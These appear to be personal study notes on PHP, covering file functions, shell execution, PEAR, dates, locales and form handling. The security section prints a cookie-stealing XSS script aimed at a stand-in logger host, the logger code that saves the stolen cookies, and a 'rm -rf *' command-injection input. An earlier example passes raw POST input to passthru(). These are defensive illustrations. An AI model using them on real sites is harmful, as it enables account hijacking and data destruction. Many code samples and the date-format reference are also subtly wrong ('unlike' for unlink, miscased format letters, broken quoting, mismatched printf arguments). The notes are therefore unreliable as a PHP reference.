resource opendir(string <path> [, resource <context>])

To close a dir handle, we can just closedir():

void closedir(resource <directory_handle>)

To parse the contents of a dir stream, we can use readdir():

string readdir([resource <dir_handle>])

An example, to list files and child dirs in dir:

<?php
	$dh = opendir('/usr/local/apache2/htdocs/');
	while ($file = readdir($dh))
		echo "$file <br />";
	closedir($dh);
?>

An example output:

.
..
articles
images
news
test.php

if dir_handle is ommited, it attempts to read from the last link opened by opendir()

If we wish to read in contents of a dir into an array, we can use scandir():

array scandir(string <dir> [, int <sorting_order> [, resource <context>]])

NOTE: Returns FALSE if fails

Note: the default sorting is ascending order, if sorting_order is set to 1, it is descending order

an example of usage:

<?php
	print_r(scandir('/usr/local/apache2/htdocs'));
?>

Gives:

Array ( [0] => . [1] => .. [2] => articles [3] => images [4] => news [5] => test.php )

if we wish to remove a dir, we can use rmdir():

int rmdir(string <dirname>)

Returns true if successful, false otherwise.

Since PHP executes it's remove directive on the level of the server daemon, we must have writing permission to the dir being removed.
And the dir must be empty, to simply be removed.

Another approach is to cause a recursive function call to empty the Dir first, and then remove the actual dir.

An example follows, of using a recursive function on it:

<?php
	function deleteDirectory($dir)
	{
		if ($dh = opendir($dir))
		{
			//iterate through dir contents
			while (($file = readdir ($dh)) != false)
			{
				if (($file == "." || ($file == "..")) continue;
				if (is_dir($dir . '/' . $file))
					deleteDirectory($dir . '/' . $file);
				else
					unlike($dir . '/' . $file);
			}

			closedir($dh);
			rmdir($dir);
		}
	}

	$dir = '/usr/local/apache2/htdocs/book/chapter10/test/';
	deleteDirectory($dir);
?>

To rename a file, we can use the rename() function:

boolean rename(string <oldname>, string <newname> [, resource <context>])

Returns TRUE if it was successful, FALSE otherwise.

NOTE: Since PHP operates under the server daemon, we need writing permissions to rename stuff.

if we wish to set a file last-modified and last-accessed times we can use touch(), returning TRUE if it could, FALSE otherwise.
Requires permissions, due to Server DAEMON.

int touch(string <filename> [, int <time> [, int <atime>]])

if time is not provided, current server time is used. atime is for access time, works the same.

If the filename file does not exist, PHP attempts to create it, assuming permissions are given for that.

In PHP, we can access websites, for instance htmldocs, as follows:

%>htmldoc --webpage -f webpage.pdf http://www.wjgilmore.com/

In php, we can access websites through the commandline with the passthru() method.

To return said PDF:

$document = $_POST['userurl'];
passthru("htmldoc --webpage -f webpage.pdf $document");

if we wish to delimit input in PHP, we can use the escapeshellarg():

string escapeshellarg(string <arguments>) //encases commands in '', making the entire command input literal

If we wish to sanitize against shell metachars, we can use escapeshellcmd():

string escapeshellcmd(string <command>)

if we wish to run OS level apps that are to be run in the BG, we can use exec():

string exec(string <command> [, array &output [, int &return_var]])

if we specify output, we get the entire output in an array, otherwise we just get the last line.

We can also discover the return status by virtue of return_var.

Assume that we have a perl script:

#! /usr/bin/perl
my @languages = qw[perl php python java c];
foreach $language (@languages) {
	print $language."<br />";
}

We can call upon this script, in PHP, by using exec():

<?php
	$outcome = exec("languages.pl", $results);
	foreach ($results as $result) echo $result;
?>

Would give the output of each language in languages.

If we wish to output the executed commands results, we can use system():

string system(string <command> [, int <return_var>])

the system() method returns the output directly to the caller, instead of to an alternative output.

An example of listing all files in a specific dir:

$mymp3s = system("ls -1 /home/jason/mp3s/");

The following PHP script calls the languages perl script with system():

<?php
	$outcome = system("languages.pl", $results);
	echo $outcome
?>

If we wish to return binary output, we should use passthru() instead:

void passthru(string <command> [, int &return_var])

an example, where we convert GIF images to PNG, using Netpbm:

<?php
	header('ContentType:image/png');
	passthru('giftopnm cover.gif | pnmtopng > conver.png'); //run giftopnm on the gif, pipe it to pnmtopng and output the result to cover.png
?>

if we wish to designate a specific string to be a shellcommand, then we can use ` ticks, as follows:

<?php
	$result = `date`;
	printf("<p>The server timestamp is: %s", $result);
?>

The output would be as follows:

The server timestamp is: Sun Mar 3 15:32:14 EDT 2010

An identical way of doing `` calling, is using shell_exec() as follows:

string shell_exec(string <command>)

An example follows, with the previous date calling:

<?php
	$result = shell_exec(`date`);
	printf("<p>The server timestamp is: %s</p>", $result);
?>

An example of using a package installed from PEAR to display stuff in Roman numerals:

<?php
	//Make the Numbers_Roman package available
	require_once("Numbers/Roman.php");

	//Retrieve current year
	$year = date("Y");

	//Convert year to Roman numerals
	$romanyear = Numbers_Roman::toNumeral($year); //Class function call from Numbers_Roman class

	//Output the copyright statement
	echo "Copyright &copy; $romanyear"; //the &copy; is the copyright logo
?>

To update the PEAR manager, we can use the following command:

%>pear upgrade

To browse the PEAR package manager, we can use the following syntax:

%>pear [options] command [command-options] <parameters>

If we wish to find out more about a specific command, we can do as follows:

%>pear help <command>

NOTE: If PEAR does not execute because the command is not found, you need to add the exe dir to your system path

To see what packages are installed on our computer, we can use the list command, as follows:

%>pear list

To learn more about a specific package that is installed, we can use the following syntax:

%>pear info <package-name>

This would give a long list about more specific info about that package

if we wish to install a PEAR package, we can simply write:

%>pear install [options] <package name>

an example:

%>pear install Auth

If we wish to install all dependancies that are optional for a package, we can do as follows:

%>pear install -a <Module name>

or

%>pear install --alldeps <module name>

If we wish to get the package manually, we can go to the website at pear.php.net or pear.php.net/<module name>

When we install manually, we must put em in our PEAR dir, and if one does not exist, we create a PEAR dir in our home dir.

To use a PEAR module, you must:

use a include or require statement

and

have your PEAR dir added to include_path dir

In terms of PEAR names, a _ is represented by / in terms of requiring and including.

To update a single package, we can use the upgrade statement:

%> pear upgrade <package name>

if we wish to upgrade everything installed, we can do:

%>pear upgrade-all 

NOTE: Doing this is not smart, because it can cause compability issues. Only use if the full extent of upgrading is known

To uninstall a PEAR package, we simple do as follows:

%>pear uninstall [options] <pack_name> <packname_1> <packname_2> <packname_N>

Beyond PEAR, there is a PEAR manager, called Pyrus

To use Pyrus, to install a pear package, we could do as follows:

%>php pyrus.phar install pear/Numbers_Roman

Note: Before you use date times or timestamps, config the php.ini by configuring the date.timezone directive or set the time zone
by using the date_default_timezone_set().

To validate a date, we can use the checkdate() method:

boolean checkdate(int <month>, int <day>, int <year>)

Returns true if the supplied Date is valid, False otherwise. What follows, is an example:

echo "April 31, 2010: ".(checkdate(4, 31, 2010) ? 'Valid' : 'Invalid');
//Will give false, because April only has 30 days

echo "Feburary 29, 2012: ".(checkdate(02,29,2012) ? 'Valid : 'Invalid');
//Checks against Leapyear, true in this case

echo "Feburary 29, 2011: ".(checkdate(02,29,2011) ? 'Valid' : 'Invalid');
//Checks against Leapyear, false in this case

To return the date, we can use the date():

string date(string <format> [, int <timestamp>])

If we pass a unix formatted date into timestamp, we get a string representation of that date and time.
If not provided, the current Unix timestamp is used.

What follows, is a list of the parameters which format can take, and what each format does:

Parameter 			Description 				Example

A 					lowercase am or pm 			am or pm

A 					uppercase AM or PM 			AM or PM

D 					Day of month, leading 0 	01 to 31

D 					Three letters days 			Mon through Sun

E 					Timezone Identifier 		America/New_York

F 					Full length months 			January through December

G 					12-hour format, no 0 		1 through 12

G 					24-hour format 		 		0 through 23

H 					12-hour format, with 0 		01 through 12

H 					24-hour format, with 0 		00 through 23

i 					Minutes, with zeros 		01 through 60

I 					Daylight saving time 		0 if no, 1 if yes

J 					Day of month, without 0 	1 through 31

l 					Full length days 			Monday through Sunday

L 					leap year 					0 if no, 1 if yes

m 					Numeric months 				01 through 12

M 					Three letter months 		Jan through Dec

n 					Numeric months without 0 	1 through 12

O 					Difference to GMT from US 	-0500

r 					day, date/month/year/time 	Tue, 19 Apr 2010 22:37:00 -0500

S 					Seconds, with zeros 		00 through 59

S 					Ordinal suffix of day 		st, nd, rd, th

t 					days in month 				28 through 31

T 					time zone 					PST, MST, CST, EST, etc.

U 					Seconds since unix Epoch 	1172347916

w 					Numerics for weekdays 		0 through 6 (0 being Sunday, 6 Saturday)

W 					week number of year 		1 through 52 or 53

Y 					4 digit years 				1901 through 2038

z 					Day of year 				0 through 364

Z 					Time zone offset in sec 	-43200 through 50400

What follows, are some examples of using date():

echo "Today is ".date("F d, Y");
//Today is August 22, 2010

Echo "Today is ".date("l");
//Today is wednesday

$weekday = date("l");
$daynumber = date("jS");
$monthyear = date("F Y");

printf("Today is %s day of %s", $weekday, $daynumber, $monthyear);

gives:

Today is Sunday the 22nd of August 2010

Note: You can add punctuation as you please into the date call, to cause seperations:

echo date("m-d-Y");
//04-26-2010

We can also use date() to get times:

echo "The time is ".date("h:i:s");
// The time is 07:44:53

echo "The time is ".date("h:i:sa");
// The time is 07:44:53pm

To learn more about the current time, we can run the gettimeofday() method:

mixed gettimeofday([boolean <return_float>])

The array by default contains the following:

dsttime: 0, 1(US), 2(Australia), 3(western europe), 4(middle europe), 5(eastern europe), 6(Canda), 7(Great Britian and Ireland), 8(Romania),
9(Turkey) and 10 (Australia old version)

minuteswest : The number of minutes west of GMT

sec : The number of seconds since the UNix epoch

usec : microseconds

An example:

$time = gettimeofday();
$UTCoffset = $time['minuteswest']/60;
printf("Server location is %d hours west of UTC.", $UTCoffset);

gives:

Server location is 5 hours west of UTC.

return_float, if enabled, returns the current time as a float.

A useful method for presenting dates and counting on such, is the getdate():

array getdate([int <timestamp>])

In total there are 11 elements:

hours: 0 through 23

mday : day of month, 1 through 31

minutes : 0 through 59

mon : month, 1 through 12

month: text of month, like July

seconds : 0 through 59

wday : number for wdays (0 for Sunday)

weekday : text for wday (Friday etc.)

yday : Number of day, 0 through 364

year : four digit year

0 : Number of seconds since epoch

If no timestamp is provided to getdate(), the current time is assumed and used.

The array returned is a associative array with the values above.

To get a timestamp of the current time, we can use time():

int time()

Assume we ran time() on May 24, 2010, 15:31:22 EDT , we'd get:

1274729482

To get it back in a readable format, we could then do:

echo date("F d, Y h:i:s", 1274729482);

gives:

May 24, 2010 03:31:22

To create a timestamp for a specific time, we can use mktime():

int mktime([int hour [, int minute [, int second [, int month [, int day [, int year]]]]]])

if we wish to set Localized values for letters, characters, currencies etc. Then we can specify the setlocale() method:

string setlocale(integer <category>, string <locale> [, string <locale> ...])

string setlocale(integer <category>, array <locale>)

The locale value is defined as follows, for example:

it_IT.utf8 //Italian

he_IL.utf8 //israeli

en_GB.utf8 //British

en_US.utf8 //US

The utf8 part can be modified based on regions, due to different localized versions, such as follows:

zh_CN.gb18030 is used for Mongolian, Tibetian, Uigur and Yi

zh_CN.ggb3212 is used for simple chinese

In total, there are 6 categories, supported:

LC_ALL : all categories that follows

LC_COLLATE : string comparison, useful for chars such as â and é

LC_CTYPE : Allows special chars to be converted as they should be

LC_MONETARY : Monetary formatting ($50) is US version, (50) is EU

LC_NUMERIC : Numeric presentation. (1,412.00) is US, (1.412,00) is EU

LC_TIME : Date and Time repesentation. once set, can use strftime() to get localized format

an example of getting Italian values:

setLocale(LC_TIME, "it_IT.utf8");
echo strftime("%A, %d %B, %Y");

gives:

lunedi, 24 maggio, 2010

An example of how to output stuff in Italian:

<?php
	setlocale(LC_ALL, "it_IT.utf8");
	$tickets = 2;
	$departure_time = 1276574400;
	$return_time = 127719200;
	$cost = 1350.99;
?>
Numero di bilgetti: <?= $tickets; ?><br />
Orario di partenza: <?= strftime("%d %B, %Y", $departure_time); ?><br />
Orario di ritorno: <?= strftime("%d %B, %Y", $return_time); ?><br />
Prezzo IVA incluso: <?= money_format('%i', $cost); ?><br />

would give a formatted output of italian stuff //Euro, italian months etc. etc.

To get the last modified date of a website, we can use a combination of date() and getlastmod():

$lastmod = date("F d, Y h:i:sa", getlastmod());
echo "Page last modified on $lastmod";

gives:

Page last modified on Feburary 26, 2010 07:59:34pm

An example of determining how many days there are in the current month:

printf("There are %d days in %s.", date("t"), date("F"));

gives:

There are 30 days in April.

If we wish to determine it for a arbitrary, we have to run it on a more complicated scale:

$lastday = mktime(0, 0, 0, 2, 1, 2010);
printf("There are %d days in Feburary 2010.", date("t", $lastday));

Gives:

There are 28 days in Feburary 2010

If we wish to see what day it will be in X days, we can use strtotime():

$futuredate = strtotime("+45 days");
echo date("F d, Y", $futuredate);

gives:

July 08, 2010

By doing minus, we can backwards check:

$pastdate = strtotime("-45 days");
echo date("F d, Y", $pastdate);

gives:

April 09, 2010

We can do weeks as well as days:

$futuredate = strtotime("10 weeks 2 days");
echo date("F d, Y", $futuredate);

gives:

August 04, 2010

In 5.1+, we got a cooler way to set Datetime, by virtue of the DateTime class:

object DateTime([string <time> [, DateTimeZone <timezone>]])

To make a DateTime object, we can call the constructor, as follows:

$date = new DateTime();

To create an object and set the date to May 25, 2010, we can do:

$date = new DateTime("25 May 2010");

We can also set the time:

$date = new DateTime("25 May 2010 21:55");

We can also just set time:

$date = new DateTime("21:55");

To format the datetime object, we can use the format() method, as follows:

echo $date->format("Y-m-d h:i:sa");

We have setters, as well, for the datetime object:

Boolean setDate(integer <year>, integer <month>, integer <day>)

An example:

$date = new DateTime();
$date->setDate(2010,5,25);
echo $date->format("F j, Y");

gives:

May 25, 2010

To set times, we can use setTime():

Boolean setTime(integer <hour>, integer <minute> [, integer <second>])

an example:

$date = new DateTime();
$date->setTime(20,55);
echo $date->format("h:i:s");

gives:

08:55:00

We can modify a datetime object after we have instansiated it:

$date = new DateTime("May 25, 2010 00:33");
$date->modify("+27 hours");
echo $date->format("Y-m-d h:i:s");

gives:

2010-05-26 03:33:00

If we wish to find the difference between two datetime objects, we can use the diff() method:

$terminationDate = new DateTime('2010-05-30');
$todaysDate = new DateTime('today');
$span = $terminationDate->diff($todaysDate);
echo "Your subscription ends in {$span->format('%d')} days!";

In terms of PHP, there are two parts to have transactions of information (input and processing input):

Webforms (input) and GET or $_POST (processing)

An example is as follows:

<input type="text" id="email" name="email" size="20" maxlength="40" />

You can reference to the email, with the following:

$_POST['email']

as follows:

$email = $_POST['email'];

What follows, is an example of how to create a script that accepts name and E-mail:

<?php
	// If the name field is filled in
	if (isset($_POST['name']))
	{
		$name = $_POST['name'];
		$email = $_POST['email'];
		printf("Hi %s! <br />", $name);
		printf("The adress %s will soon be a spam-magnet! <br />", $email);
	}
?>

<form action="subscribe.php" method="post">
	<p>
		Name:<br />
		<input type="text" id="name" name="name" size="20" maxlength="40" />
	</p>
	<p>
		Email Address:<br />
		<input type="text" id="email" name="email" size="20" maxlength="40" />
	</p>
	<input type="submit" id="submit" name = "submit" value="Go!" />
</form>

In PHP, you can self-refer to the script, without actually having the name, by accessing the $_SERVER superglobal with 'PHP_SELF', as follows:

<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">

In terms of attacks against websites, you can attack with injections but also cross-site scripting, which allows for hijacking user accounts.

Just as injections can occur with SQL queries, queries to System() and Exec() can cause severe security problems.

One example of how easy it is to get info from a Site, with retrieval of a cookie, is to just write the following:

javascript:void(alert(document.cookie))

Using some JS, they can direct the info through a PHP logger, as follows:

<script>
	document.location = 'http://www.example.org/logger.php?cookie=' + document.cookie //Can access the cookie info about said site
</script>

If input is not checked, these kinds of methods can be used to redirect info and then later on return to the site to cause havoc with said info

The logger PHP might look as follows:

<?php
	//Assign GET variable
	$cookie = $_GET['cookie']; //Access Superglobal $_GET list and retrieve info about the cookie

	//Format variable in easily accessible manner
	$info = "$cookie\n\n"; //Make the info easy to read

	//Write info to the file
	$fh = @fopen("/home/cookies.txt", "a"); //Declare a fileholder for the cookie
	@fwrite($fh, $info); //write to the file 

	//Return to original site
	header("Location: http://www.example.com");
?>

Note: There is A LOT MORE in terms of Security for PHP in terms of guarding, other than just data sanitization, typecasting, and the use of the coming methods.

In general, there are 4 methods which allows us to use them as safety measures:

------------------------------------------------------------------------------------------------------
escapeshellarg(): 

string escapeshellarg(string arguments)

Causes whatever arg that is passed, to single quote or double quote the inputs, encapsulating the entire commands, making injectionlike commands
harder to pass in.


------------------------------------------------------------------------------------------------------
escapeshellcmd():

string escapeshellcmd(string command)

Escapes special characters

In context of using exec(), we could use escapeshellcmd() to acommedate it, an example as follows:

exec("/usr/bin".$command."inventory_manager ".$sku." ".$inventory);

where the attack could be:

pass these to $command:

blah;rm -rf *;
/usr/bin/blah; rm -rf *; inventory_manager 50XCH67YU 50

putting in escapeshellcmd() would make the command instead resolve to:

The command variable would be:

blah\; rm -rf \*;

/usr/bin/blah rm -rf 


------------------------------------------------------------------------------------------------------
htmlentities()

string htmlentities(string <input> [, int <quote_style> [, string <charset>]])

Converts special characters that relate to HTML to their literal HTML equivilant, stopping their
format from being actually processable. The ones accounted for:

& : becomes &amp;

" : becomes &quot; (Assuming quote_style is set to ENT_NOQUOTES)

> : becomes &gt;

< : becomes &lt;

' : becomes &#039; (assuming quote_style is set to ENT_NOQUOTES)

Refering back to the old example with JS, it would become:

&lt;scriptgt;
document.location = 'http://www.example.org/logger.php?cookie=' + document.cookie
&lt;/script&gt;

------------------------------------------------------------------------------------------------------
stip_tags()

string strip_tags(string <str> [, string <allowed tags>])

Strips HTML tags from specified string, only causing exceptions for the elements of allowed tags

<?php
	$input = "I <td>really</td> love <i>PHP</i>!";
	$input = strip_tags($input, "<i></i>");
	// $input now equals "I really love <i>PHP</i>!"
?>

------------------------------------------------------------------------------------------------------

In PHP, we have access to 7 filters that does conformation for us - Which can be used with filter_var(). 

An example:

$email = "john@@example.com";
if (! filter_var($email, FILTER_VALIDATE_EMAIL))
{
	echo "INVALID EMAIL!";
}

The list of modifiers for filter_var follows:

FILTER_VALIDATE_BOOLEAN 	: 	Targets Booleans

FILTER_VALIDATE_EMAIL 		: 	Targets Emails

FILTER_VALIDATE_FLOAT 		: 	Floats

FILTER_VALIDATE_INT 		: 	Ints

FILTER_VALIDATE_IP 			: 	Ip adresses

FILTER_VALIDATE_REGEXP 		: 	Regexes

FILTER_VALIDATE_URL 		: 	URLs

Further more, each Filter option has flags, such as IP Filters having flags for IPV6 and IPV4:

$ipAddress = "192.168.1.01";
{
	echo "Please provide an IPV6 address!";
}

We can also use Filter extensions to sanatize data, as follows:

$userInput = "Love the site. E-mail me at <a href='http://www.example.com'>Spammer</a>.";
$sanitizedInput = filter_var($userInput, FILTER_SANITIZE_STRING);
// $sanitizedInput = Love the site. E-mail me at Spammer.

As far as Sanitizing with filter extensions, there are 9 extensions, as follows:

FILTER_SANITIZE_EMAIL 	: 		Removes all chars from a string except thoose allowable in a E-mail

FILTER_SANITIZE_ENCODED : 		URL encodes a string, producing output identical to that returned by the urlencode() function

FILTER_SANITIZE_MAGIC_QUOTES :	Escapes potentionally dangerous chars with \ using the addslashes() function

FILTER_SANITIZE_NUMBER_FLOAT : 	Removes any chars that would result in a float not recognized by PHP

FILTER_SANITIZE_NUMBER_INT 	 : 	removes any char that would result in a Int not recognized by PHP

FILTER_SANITIZE_SPECIAL_CHARS : HTML encodes ', ", <, >, &, tab, backspace etc. Takes any ASCII char that has less than 32 in value

FILTER_SANITIZE_STRING 		  : Strips all tags such as <p> and <b>

FILTER_SANITIZE_URL 		  : Removes all chars from a string except for thoose allowable within a URL as defined within RFC3986

FILTER_UNSAFE_RAW 			  : Used in conjunction with various optional flags, FILTER_UNSAFE_RAW can strip and encode characters in a variety of ways

As per the others, there is a ton of flags to accomedate the behaviour of each. the PHP manual tells more of all the filters (earlier ones as well) Flags.

To spawn a set of boxes that allows choices, in HTML, we could do as follows:

<select name="languages[]" multiple="multiple">
	<option value="csharp">C#</option>
	<option value="javascript">JavaScript</option>
	<option value="perl">Perl</option>
	<option value="php">PHP</option>
</select>

As for output of the PHP, it would look as follows, with an array:

<?php
	if (isset($_POST['submit']))
	{
		echo "You like the following languages:<br />";
		foreach($_POST['languages'] AS $language) {
			$language = htmlentities($language);
			echo "$language<br />";
		}
	}
?>

As of handling the actual box values, in PHP:

<form action="<?php echo $_SEVER['PHP_SELF']; ?>" method="post">
	What's your favorite programming language?<br /> (check all that apply):<br />
	<input type="checkbox" name="languages[]" value="csharp" />C#<br />
	<input type="checkbox" name="languages[]" value="javascript" />JavaScript<br />
	<input type="checkbox" name="languages[]" value="perl" />Perl<br />
	<input type="checkbox" name="languages[]" value="php" />PHP<br />
	<input type="submit" name="submit" value="Submit!" />
</form>

if we chose Csharp and PHP, we'd get the following output:

You like the following languages:
csharp
php

In PEAR, we have access to a package called HTML_QuickForm2, which allows quick spawning of Validations of Client and Serverside,
templating engines like Smarty etc.  (Smarty is something that allows you to create your own elements)

To install HTML_QuickForm2, you can install it from PEAR, but since it has dependancies, we have to do require deps as well:

%>pear install --onlyreqdeps HTML_QuickForm2-alpha

What follows, is an example of how to create a more advanced interface with required fields, using HTML_QuickForm2:

<?php
	
	require_once "HTML/QuickForm2.php";
	require_once 'HTML/QuickForm2/Renderer.php';

	$languages = array(
		'' => 'Choose Language:',
		'C#' => 'C#',
		'JavaScript' => 'JavaScript',
		'Perl' => 'Perl',
		'PHP' => 'PHP'
	);

	$form = new HTML_QuickForm2('languages', 'POST');

	$fieldSet = $form->addFieldSet()->setLabel('Your Developer Profile');

	$name = $fieldSet->addText('name')->setLabel('Your name:');
	$name->addRule('required', 'Please provide your name.');

	$email = $fieldSet->addText('email')->setLabel('Your E-mail Addresses');
	$email->addRule('required', 'Please provide your E-mail.'); //We can do a lot more than just require, we can do length checks, Ranges, other values etc.


	$language = $fieldSet->addSelect('language', null, array('options' => $languages));
	$language->setLabel('Choose Your Favorite Programming Language:');
	$language->addRule('required', 'Please choose a programming language');

	$fieldSet->addElement('submit', null, 'Submit!');

	if ($form->validate()) {
		echo "<p>SUCCESS</p>";
	}

	$renderer = HTML_QuickForm2_Renderer::factory('default')->setOption(array('group_errors' => true));

	echo $form->render($renderer);
?>